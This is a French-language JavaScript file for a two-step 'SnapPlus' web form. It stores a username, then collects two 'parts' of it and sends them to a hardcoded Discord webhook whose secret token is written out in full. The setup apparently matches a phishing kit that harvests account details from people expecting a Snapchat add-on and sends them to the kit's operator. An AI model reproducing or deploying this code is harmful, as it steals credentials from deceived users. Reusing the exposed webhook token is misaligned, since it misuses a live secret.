```javascript
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";


// ==========================================
// ÉTAPE 1 : PSEUDO
// ==========================================

const pseudoForm = document.getElementById("pseudoForm");

if (pseudoForm) {
  const pseudoInput = document.getElementById("pseudo");
  const submitButton = document.getElementById("submitButton");
  const errorMessage = document.getElementById("errorMessage");
  const buttonText = submitButton.querySelector(".button-text");

  pseudoForm.addEventListener("submit", (event) => {
    event.preventDefault();

    const pseudo = pseudoInput.value.trim();

    errorMessage.textContent = "";

    if (pseudo.length < 2) {
      errorMessage.textContent =
        "Ton pseudo doit contenir au moins 2 caractères.";
      pseudoInput.focus();
      return;
    }

    if (pseudo.length > 32) {
      errorMessage.textContent =
        "Ton pseudo ne peut pas dépasser 32 caractères.";
      pseudoInput.focus();
      return;
    }

    // On garde le pseudo pour l'étape suivante.
    sessionStorage.setItem("snapplus_pseudo", pseudo);

    submitButton.disabled = true;
    pseudoInput.disabled = true;
    buttonText.textContent = "Continuer…";

    // IMPORTANT : on va vers la page de vérification.
    window.location.href = "verification.html";
  });
}


// ==========================================
// ÉTAPE 2 : CONFIRMATION
// ==========================================

const verificationForm =
  document.getElementById("verificationForm");

if (verificationForm) {
  const firstPart = document.getElementById("firstPart");
  const secondPart = document.getElementById("secondPart");
  const verificationButton =
    document.getElementById("verificationButton");
  const verificationError =
    document.getElementById("verificationError");
  const buttonText =
    verificationButton.querySelector(".button-text");

  verificationForm.addEventListener("submit", async (event) => {
    event.preventDefault();

    const first = firstPart.value.trim();
    const second = secondPart.value.trim();

    verificationError.textContent = "";

    if (!first || !second) {
      verificationError.textContent =
        "Remplis les deux parties du pseudo.";
      return;
    }

    verificationButton.disabled = true;
    firstPart.disabled = true;
    secondPart.disabled = true;
    buttonText.textContent = "Envoi…";

    try {
      const response = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:
            "🔎 Confirmation SnapPlus\n\n" +
            `Première partie : **${first}**\n` +
            `Deuxième partie : **${second}**`
        })
      });

      if (!response.ok) {
        throw new Error(`Discord HTTP ${response.status}`);
      }

      // Envoi réussi → page finale.
      sessionStorage.removeItem("snapplus_pseudo");

      window.location.href = "success.html";

    } catch (error) {
      console.error("Erreur webhook :", error);

      verificationError.textContent =
        "Impossible d'envoyer la confirmation.";

      verificationButton.disabled = false;
      firstPart.disabled = false;
      secondPart.disabled = false;
      buttonText.textContent = "Confirmer →";
    }
  });
}
```

